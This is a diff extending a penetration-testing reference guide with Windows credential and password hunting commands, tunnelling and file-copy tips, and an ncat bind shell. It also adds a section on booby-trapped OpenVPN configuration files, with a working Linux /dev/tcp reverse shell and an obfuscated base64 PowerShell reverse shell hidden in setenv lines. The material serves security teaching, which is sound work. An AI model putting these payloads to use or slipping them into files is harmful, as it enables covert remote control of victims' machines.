@@ -1448,6 +1448,20 @@ Private SSH Keys / SSH Configuration
   /etc/ssh/ssh_config  : OpenSSH SSH client configuration files
   /etc/ssh/sshd_config : OpenSSH SSH daemon configuration file
 
+Logs Files
+^^^^^^^^^^
+
+Anything helpful in the logs file? Imagine, user running a command and that being logged in auth.log?
+
+::
+
+ cat /var/log/auth.log
+
+Usually, any log files present in /var/log directory might be important.
+
+::
+
+ auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
 
 .. _unprivileged-shell-to-privileged-shell:
 
@@ -1472,6 +1486,7 @@ Run system info and findout
 * Hotfix installed
 
 The below system is running x64, Windows Server 2008 R2 with no Hotfixes installed.
+
 ::
 
  systeminfo
@@ -1531,11 +1546,22 @@ This directory is the temporary location for WSUS. Updates were downloaded here,
 
 which will inform if any hotfixes are installed.
 
+We can also run 
+
+::
+ 
+ wmic qfe
+
+ Caption                                     CSName           Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
+ http://support.microsoft.com/?kbid=4100347  LAPTOP           Update                        KB4100347               NT AUTHORITY\SYSTEM  9/17/2018
+ http://support.microsoft.com/?kbid=4343669  LAPTOP           Update                        KB4343669               NT AUTHORITY\SYSTEM  7/27/2018
+ http://support.microsoft.com/?kbid=4343902  LAPTOP           Security Update               KB4343902               NT AUTHORITY\SYSTEM  8/16/2018
+
 Metasploit Local Exploit Suggestor
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 Metasploit local_exploit_suggester : The module suggests local meterpreter exploits that can be used. The exploits are suggested based on the architecture and platform that the user has a shell opened as well as the available exploits in meterpreter.
 
-  .. Note :: It is utmost important that the meterpreter should be of the same architecture as your target machine, otherwise local exploits may fail. For example. if you have target as windows 64-bit machine, you should have 64-bit meterpreter.
+.. Note :: It is utmost important that the meterpreter should be of the same architecture as your target machine, otherwise local exploits may fail. For example. if you have target as windows 64-bit machine, you should have 64-bit meterpreter.
 
 Sherlock and PowerUp Powershell Script
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
@@ -1625,6 +1651,200 @@ If we have any of the below privileges, we can possibly utilize `Rotten Potato <
 
 The above was for the Windows OS and the below is for Linux OS.
 
+Credential Manager
+^^^^^^^^^^^^^^^^^^
+
+Sometimes, the user might have save his credentials in the memory while using "runas /savecred" option. We could check this by
+
+::
+
+ cmdkey /list
+ dir C:\Users\username\AppData\Local\Microsoft\Credentials\
+ dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+ Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
+ Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
+
+.. Note :: Sometimes, while using Metasploit web delivery method, if the reverse_https payload doesn't work try reverse tcp maybe?
+
+Other Enumeration
+^^^^^^^^^^^^^^^^^
+
+Mostly taken from `Windows Privilege Escalation Guide <https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/>`_
+
+**Environment Variables** : A domain controller in LOGONSERVER?
+
+::
+
+ set
+ Get-ChildItem Env: | ft Key,Value
+
+**Connected Drives**
+
+::
+
+ net use
+ wmic logicaldisk get caption,description,providername
+ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
+
+**Users**
+
+Who are you?
+
+::
+
+ whoami
+ echo %USERNAME%
+ $env:UserName
+
+What users are on the system? Any old user profiles that weren’t cleaned up?
+
+::
+
+ net users
+ dir /b /ad "C:\Users\"
+ dir /b /ad "C:\Documents and Settings\" # Windows XP and below
+ Get-LocalUser | ft Name,Enabled,LastLogon
+ Get-ChildItem C:\Users -Force | select Name
+
+Is anyone else logged in?
+
+::
+
+ qwinsta
+
+What groups are on the system?
+
+::
+
+ net localgroup
+ Get-LocalGroup | ft Name
+
+Are any of the users in the Administrators group?
+
+::
+
+ net localgroup Administrators
+ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
+ 
+Anything in the Registry for User Autologon?
+
+::
+
+ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
+ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
+
+**Programs**
+
+What software is installed?
+
+::
+
+ dir /a "C:\Program Files"
+ dir /a "C:\Program Files (x86)"
+ reg query HKEY_LOCAL_MACHINE\SOFTWARE
+ Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
+ Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
+
+**Processes/ Services**
+
+::
+
+ tasklist /svc
+ tasklist /v
+ net start
+ sc query
+
+Get-Process has a -IncludeUserName option to see the process owner, however you have to have administrative rights to use it.
+
+::
+
+ Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
+ Get-Service
+
+This one liner returns the process owner without admin rights, if something is blank under owner it’s probably running as SYSTEM, NETWORK SERVICE, or LOCAL SERVICE.
+
+::
+ 
+ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize
+
+**Scheduled Tasks**
+
+::
+
+ schtasks /query /fo LIST 2>nul | findstr TaskName
+ dir C:\windows\tasks
+ Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+
+**Startup?**
+
+::
+
+ wmic startup get caption,command
+ reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+ reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+ reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+ reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+ dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
+ dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
+
+Powershell
+
+::
+
+ Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
+ Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+ Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run'
+ Get-ItemProperty -Path 'Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+ Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
+ Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
+
+**Networking**
+
+Firewall turned on? If so what’s configured?
+
+::
+
+ netsh firewall show state
+ netsh firewall show config
+ netsh advfirewall firewall show rule name=all
+ netsh advfirewall export "firewall.txt"
+
+Interesting interface configurations?
+
+::
+
+ netsh dump
+
+SNMP configurations
+
+::
+
+ reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
+ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
+
+**Sensitive Files**
+
+passwords in the registry?
+
+::
+
+ reg query HKCU /f password /t REG_SZ /s
+ reg query HKLM /f password /t REG_SZ /s 
+
+Interesting files to look at? Possibly inside User directories (Desktop, Documents, etc)?
+
+::
+
+ dir /s *pass* == *vnc* == *.config* 2>nul
+ Get-Childitem –Path C:\Users\ -Include *password*,*vnc*,*.config -File -Recurse -ErrorAction SilentlyContinue
+
+Files containing password inside them?
+
+::
+
+ findstr /si password *.xml *.ini *.txt *.config 2>nul
+ Get-ChildItem C:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password"
 
 Linux Privilege Escalation
 --------------------------
@@ -3086,6 +3306,48 @@ and
    * Attacker IP Network : 172.40.60.0/22; Attacker Current IP: 172.40.60.55 and Targetted IP: 172.16.96.2 (Possible SCADA Network - Natted IP)
    * As it's a industrial plant, there's a firewall between IT Network (172.40.60.0/22) and SCADA Network (Possible IP 172.16.96.2 -- This is NATTed IP)
 
+VPN-like tunnelling?
+^^^^^^^^^^^^^^^^^^^^
+
+`sshuttle <https://github.com/sshuttle/sshuttle>`_ Transparent proxy server that works as a poor man's VPN. Forwards over ssh. Doesn't require admin. Works with Linux and MacOS. Supports DNS tunneling.
+
+So if we have a access to device at 10.1.1.1, and it also has an interface on 192.168.122.0/24 with other hosts behind it, we can run:
+
+::
+
+ # sshuttle -r root@10.1.1.1 192.168.122.0/24
+ root@10.1.1.1's password:
+ client: Connected.
+
+This creates a VPN-like connection, allowing me to visit 192.168.122.4 in a browser or with curl, and see the result.
+
+Probably, nmap won't be a good idea to run over sshuttle, however, it is a very nice way to interact with a host over a tunnel.
+
+SCP
+^^^
+
+To copy all from Local Location to Remote Location (Upload)
+
+::
+
+ scp -r /path/from/destination username@hostname:/path/to/destination
+
+To copy all from Remote Location to Local Location (Download)
+
+::
+
+ scp -r username@hostname:/path/from/destination /path/to/destination
+
+Help:
+
+* -r Recursively copy all directories and files
+* Always use full location from /, Get full location by pwd
+* scp will replace all existing files
+* hostname will be hostname or IP address
+* If custom port is needed (besides port 22) use -P portnumber
+* . (dot) - it means current working directory, So download/copy from server and paste here only.
+
+
 Plink
 -----
 
@@ -3125,6 +3387,120 @@ Plink is a windows command-line connection tool similar to UNIX ssh.
             open tunnel in place of session (SSH-2 only)
 
 It can also be used to perform SSH tunnelling, have a look at -L, -R and -D options. On Kali Linux box it is present at /usr/share/windows-binaries/plink.exe
+
+OpenVPN Configuration File Reverse Shell?
+-----------------------------------------
+
+Taken from `Reverse Shell from an OpenVPN Configuration File <https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da>`_
+
+An ovpn file is a configuration file provided to the OpenVPN client or server. The file details everything about the VPN connection: which remote servers to connect to, the crypto to use, which protocols, the user to login as, etc.
+
+At its most simple form, an ovpn file looks like the this:
+
+::
+
+ remote 192.168.1.245
+ ifconfig 10.200.0.2 10.200.0.1
+ dev tun
+
+This directs the client to connect to the server at 192.168.1.245 without authentication or encryption and establish the tun interface for communication between the client (10.200.0.2) and the server (10.200.0.1). 
+
+The OpenVPN configuration feature is important is the up command. This is how the manual describes it:
+
+::
+
+ Run command cmd after successful TUN/TAP device open (pre — user UID change).
+ cmd consists of a path to script (or executable program), optionally followed by arguments. The path and arguments may be single- or double-quoted and/or escaped using a backslash, and should be separated by one or more spaces.
+
+Basically, the up command will execute any binary of script you point it to 
+
+Linux
+^^^^^
+
+If the victim is using a version of Bash that supports /dev/tcp then getting a reverse shell is trivial. The following ovpn file will background a reverse shell to 192.168.1.218:8181.
+
+::
+
+ remote 192.168.1.245
+ ifconfig 10.200.0.2 10.200.0.1
+ dev tun
+ script-security 2
+ up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.1.218/8181 0<&1 2>&1 &'"
+
+When this ovpn file is used it won’t be obvious to the user that something is wrong. The VPN connection is established normally and traffic flows. There are only two indications in the log that perhaps something is afoot.
+
+::
+
+ Thu Jun 7 12:28:23 2018 NOTE: the current — script-security setting may allow this configuration to call user-defined scripts
+ Thu Jun 7 12:28:23 2018 ******* WARNING *******: All encryption and authentication features disabled — All data will be tunnelled as clear text and will not be protected against man-in-the-middle changes. PLEASE DO RECONSIDER THIS CONFIGURATION!
+
+Even if the the user does see these log entries a reverse shell has already been established with our listener on 192.168.1.218:
+
+::
+
+ albinolobster@ubuntu:~$ nc -lvp 8181
+ Listening on [0.0.0.0] (family 0, port 8181)
+ Connection from [192.168.1.247] port 8181 [tcp/*] accepted (family 2, sport 54836)
+ root@client:/home/client/openvpn# id
+ id
+ uid=0(root) gid=0(root) groups=0(root)
+
+
+Windows
+^^^^^^^
+
+Windows doesn’t have an analogous /dev/tcp feature. We’ll have to work a little harder to generate a reverse shell from a Windows host.
+
+Fortunately, Dave Kennedy of TrustedSec wrote a small `powershell reverse shell <https://github.com/trustedsec/social-engineer-toolkit/blob/master/src/powershell/reverse.powershell>`_ that we can use. Using powershell.exe’s -EncodedCommand 
+parameter we can pass the entire script on the command line. First, however, we’ll need to base64 encode the script to avoid having to insert escapes. Our old friend Carlos Perez has a script called `ps_encoder.py <https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py>`_ 
+that will do the encoding for us.
+
+However, there is a problem. The encoded reverse shell script is over 4000 characters long and OpenVPN has a 256 character limitation. To get around this we can use the setenv command to split up the script and then recombine it in the up command. Consider the following ovpn file:
+
+::
+
+ ifconfig 10.200.0.2 10.200.0.1
+ dev tun
+ remote 192.168.1.245
+ script-security 2
+ setenv z1 C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+ setenv a1 ‘ZgB1AG4AYwB0AGkAbwBuACAAYwBsAGUAYQBuAHUAcAAgAHsADQAKAGkAZgAgACgAJABjAGwAaQBlAG4AdAAuAEMAbwBuAG4AZQBjAHQAZQBkACAALQBlAHEAIAAkAHQAcgB1AGUAKQAgAHsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAfQANAAoAaQBmACAAKAAkAHAAcgBvAGMAZQBzAHMALgBFAHgAaQB0AEM’
+ setenv b1 ‘AbwBkAGUAIAAtAG4AZQAgACQAbgB1AGwAbAApACAAewAkAHAAcgBvAGMAZQBzAHMALgBDAGwAbwBzAGUAKAApAH0ADQAKAGUAeABpAHQAfQANAAoAJABhAGQAZAByAGUAcwBzACAAPQAgACcAMQA5ADIALgAxADYAOAAuADEALgAyADEAOAAnAA0ACgAkAHAAbwByAHQAIAA9ACAAJwA4ADEAOAAxACcADQAKACQAYwBsAG’
+ setenv c1 ‘kAZQBuAHQAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AbgBlAHQALgBzAG8AYwBrAGUAdABzAC4AdABjAHAAYwBsAGkAZQBuAHQADQAKACQAYwBsAGkAZQBuAHQALgBjAG8AbgBuAGUAYwB0ACgAJABhAGQAZAByAGUAcwBzACwAJABwAG8AcgB0ACkADQAKACQAcwB0AHIAZQBhAG0AIAA9A’
+ setenv d1 ‘CAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQANAAoAJABuAGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEIAeQB0AGUAWwBdACAAJABjAGwAaQBlAG4AdAAuAFIAZQBjAGUAaQB2AGUAQgB1AGYAZgBlAHIAUwBpAHoAZQAN’
+ setenv e1 ‘AAoAJABwAHIAbwBjAGUAcwBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMADQAKACQAcAByAG8AYwBlAHMAcwAuAFMAdABhAHIAdABJAG4AZgBvAC4ARgBpAGwAZQBOAGEAbQBlACAAPQAgACcAQwA6AFwAXAB3AGkAbgB’
+ setenv f1 ‘kAG8AdwBzAFwAXABzAHkAcwB0AGUAbQAzADIAXABcAGMAbQBkAC4AZQB4AGUAJwANAAoAJABwAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBSAGUAZABpAHIAZQBjAHQAUwB0AGEAbgBkAGEAcgBkAEkAbgBwAHUAdAAgAD0AIAAxAA0ACgAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQASQBuAGYAbw’
+ setenv g1 ‘AuAFIAZQBkAGkAcgBlAGMAdABTAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAIAA9ACAAMQANAAoAJABwAHIAbwBjAGUAcwBzAC4AUwB0AGEAcgB0AEkAbgBmAG8ALgBVAHMAZQBTAGgAZQBsAGwARQB4AGUAYwB1AHQAZQAgAD0AIAAwAA0ACgAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQByAHQAKAApAA0ACgAkAGkAb’
+ setenv h1 ‘gBwAHUAdABzAHQAcgBlAGEAbQAgAD0AIAAkAHAAcgBvAGMAZQBzAHMALgBTAHQAYQBuAGQAYQByAGQASQBuAHAAdQB0AA0ACgAkAG8AdQB0AHAAdQB0AHMAdAByAGUAYQBtACAAPQAgACQAcAByAG8AYwBlAHMAcwAuAFMAdABhAG4AZABhAHIAZABPAHUAdABwAHUAdAANAAoAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAA’
+ setenv i1 ‘MQANAAoAJABlAG4AYwBvAGQAaQBuAGcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAcwBjAGkAaQBFAG4AYwBvAGQAaQBuAGcADQAKAHcAaABpAGwAZQAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBQAGUAZQBrACgAKQAgAC0AbgBlACAALQAxACkAewAkAG8’
+ setenv j1 ‘AdQB0ACAAKwA9ACAAJABlAG4AYwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAKQApAH0ADQAKACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAGUAbgBjAG8AZABpAG4AZwAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwB1AHQAKQAsAD’
+ setenv k1 ‘AALAAkAG8AdQB0AC4ATABlAG4AZwB0AGgAKQANAAoAJABvAHUAdAAgAD0AIAAkAG4AdQBsAGwAOwAgACQAZABvAG4AZQAgAD0AIAAkAGYAYQBsAHMAZQA7ACAAJAB0AGUAcwB0AGkAbgBnACAAPQAgADAAOwANAAoAdwBoAGkAbABlACAAKAAtAG4AbwB0ACAAJABkAG8AbgBlACkAIAB7AA0ACgBpAGYAIAAoACQAYwBsA’
+ setenv l1 ‘GkAZQBuAHQALgBDAG8AbgBuAGUAYwB0AGUAZAAgAC0AbgBlACAAJAB0AHIAdQBlACkAIAB7AGMAbABlAGEAbgB1AHAAfQANAAoAJABwAG8AcwAgAD0AIAAwADsAIAAkAGkAIAA9ACAAMQANAAoAdwBoAGkAbABlACAAKAAoACQAaQAgAC0AZwB0ACAAMAApACAALQBhAG4AZAAgACgAJABwAG8AcwAgAC0AbAB0ACAAJABu’
+ setenv m1 ‘AGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByAC4ATABlAG4AZwB0AGgAKQApACAAewANAAoAJAByAGUAYQBkACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABuAGUAdAB3AG8AcgBrAGIAdQBmAGYAZQByACwAJABwAG8AcwAsACQAbgBlAHQAdwBvAHIAawBiAHUAZgBmAGUAcgAuAEwAZQBuAGcAdABoACAALQA’
+ setenv n1 ‘gACQAcABvAHMAKQANAAoAJABwAG8AcwArAD0AJAByAGUAYQBkADsAIABpAGYAIAAoACQAcABvAHMAIAAtAGEAbgBkACAAKAAkAG4AZQB0AHcAbwByAGsAYgB1AGYAZgBlAHIAWwAwAC4ALgAkACgAJABwAG8AcwAtADEAKQBdACAALQBjAG8AbgB0AGEAaQBuAHMAIAAxADAAKQApACAAewBiAHIAZQBhAGsAfQB9AA0ACg’
+ setenv o1 ‘BpAGYAIAAoACQAcABvAHMAIAAtAGcAdAAgADAAKQAgAHsADQAKACQAcwB0AHIAaQBuAGcAIAA9ACAAJABlAG4AYwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbgBlAHQAdwBvAHIAawBiAHUAZgBmAGUAcgAsADAALAAkAHAAbwBzACkADQAKACQAaQBuAHAAdQB0AHMAdAByAGUAYQBtAC4AdwByAGkAd’
+ setenv p1 ‘ABlACgAJABzAHQAcgBpAG4AZwApAA0ACgBzAHQAYQByAHQALQBzAGwAZQBlAHAAIAAxAA0ACgBpAGYAIAAoACQAcAByAG8AYwBlAHMAcwAuAEUAeABpAHQAQwBvAGQAZQAgAC0AbgBlACAAJABuAHUAbABsACkAIAB7AGMAbABlAGEAbgB1AHAAfQANAAoAZQBsAHMAZQAgAHsADQAKACQAbwB1AHQAIAA9ACAAJABlAG4A’
+ setenv q1 ‘YwBvAGQAaQBuAGcALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAbwB1AHQAcAB1AHQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAKQApAA0ACgB3AGgAaQBsAGUAKAAkAG8AdQB0AHAAdQB0AHMAdAByAGUAYQBtAC4AUABlAGUAawAoACkAIAAtAG4AZQAgAC0AMQApAHsADQAKACQAbwB1AHQAIAArAD0AIAAkAGUAbgBjAG8’
+ setenv r1 ‘AZABpAG4AZwAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABvAHUAdABwAHUAdABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAApACkAOwAgAGkAZgAgACgAJABvAHUAdAAgAC0AZQBxACAAJABzAHQAcgBpAG4AZwApACAAewAkAG8AdQB0ACAAPQAgACcAJwB9AH0ADQAKACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAG’
+ setenv s1 ‘UAbgBjAG8AZABpAG4AZwAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwB1AHQAKQAsADAALAAkAG8AdQB0AC4AbABlAG4AZwB0AGgAKQANAAoAJABvAHUAdAAgAD0AIAAkAG4AdQBsAGwADQAKACQAcwB0AHIAaQBuAGcAIAA9ACAAJABuAHUAbABsAH0AfQAgAGUAbABzAGUAIAB7AGMAbABlAGEAbgB1AHAAfQB9AA==’
+ up 'C:\\Windows\\System32\\cmd.exe /c (start %z1% -WindowStyle Hidden -EncodedCommand %a1%%b1%%c1%%d1%%e1%%f1%%g1%%h1%%i1%%j1%%k1%%l1%%m1%%n1%%o1%%p1%%q1%%r1%%s1% ) ||'
+
+We can see the encoded script has been split over a setenv commands. At the very end, the script just runs all the environment variables together.
+
+Result
+
+::
+
+ albinolobster@ubuntu:~$ nc -lvp 8181
+ Listening on [0.0.0.0] (family 0, port 8181)
+ Connection from [192.168.1.226] port 8181 [tcp/*] accepted (family 2, sport 51082)
+ Microsoft Windows [Version 10.0.17134.48]
+ © 2018 Microsoft Corporation. All rights reserved.
+ C:\Users\albinolobster\OpenVPN\config\albino_lobster>whoami
+ desktop-r5u6pvd\albinolobster
+ C:\Users\albinolobster\OpenVPN\config\albino_lobster>
+
+Using untrusted ovpn files is dangerous. You are allowing a stranger to execute arbitrary commands on your computer. Some OpenVPN compatible clients like Viscosity and Ubuntu’s Network Manager GUI disable this behavior.
 
 HTTP
 ----
@@ -3455,6 +3831,16 @@ If you see, something like this
 
 it's probably `SECCURE Elliptic Curve Crypto Utility for Reliable Encryption <http://point-at-infinity.org/seccure/>`_ Utilize python module `seccure <https://pypi.python.org/pypi/seccure>`_ to get the plaintext. 
 
+GPG
+^^^
+
+Where are the GPG Keys stored?
+
+By default in ~/.gnupg/ and can be found using 
+
+::
+
+ gpg -K
 
 Network Information
 -------------------
@@ -3691,6 +4077,9 @@ Grep in input box?
 
 Others
 ------
+
+* While downloading files from FTP, make sure that you have set the mode to binary, otherwise downloaded files could be corrupted.
+
 * It is important to check .profile files also. As it might contain scripts which are executed when a user is logged in. Also, it might be important to see how a application is storing password.
 
 * If there's a RCE in some web-application, probably, one of the way to check RCE is to ping your own machine.
@@ -4190,6 +4579,23 @@ Useful Tools
 
 * `Nishang <https://github.com/samratashok/nishang>`_ is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.
 
+* `Ncat <https://nmap.org/book/ncat-man-examples.html>`_ Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project and is the culmination of the currently splintered family of Netcat incarnations. It is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users. Ncat will not only work with IPv4 and IPv6 but provides the user with a virtually limitless number of potential uses. 
+  Among Ncat's vast number of features there is the ability to chain Ncats together; redirection of TCP, UDP, and SCTP ports to other sites; SSL support; and proxy connections via SOCKS4, SOCKS5 or HTTP proxies (with optional proxy authentication as well). Some general principles apply to most applications and thus give you the capability of instantly adding networking support to software that would normally never support it.
+ 
+ Few important example is 
+
+ Redirect any incoming traffic on TCP port 8080 on the local machine to host (example.org -in below example) on port 80.
+
+ ::
+
+  ncat --sh-exec "ncat example.org 80" -l 8080 --keep-open
+
+ Bind to TCP port 8081 and attach /bin/bash for the world to access freely.
+
+ ::
+
+  ncat --exec "/bin/bash" -l 8081 --keep-open""
+
 .. _A1-Local-file-Inclusion:
 
 Appendix-I : Local File Inclusion
@@ -4514,6 +4920,9 @@ Appendix-II : File Upload
 
 Examples
 --------
+
+.. Note :: If sometimes, we are trying to upload a php file and it's not a allowed extension, maybe try with php5 extension. The file extension tells the web server which version of PHP to use. 
+           Some web servers are set up so that PHP 4 is the default, and you have to use .php5 to tell it to use PHP 5.
 
 Simple File Upload
 ^^^^^^^^^^^^^^^^^^
@@ -4918,6 +5327,8 @@ FTP
 ---
 
 We can utilize FTP to download/ upload files from a ftp server. FTP Client is usually installed on Windows by default.
+
+.. Note :: While downloading files from ftp, remember to switch to binary mode, otherwise the file could be corrupted.
 
 Setting up the Server
 ^^^^^^^^^^^^^^^^^^^^^
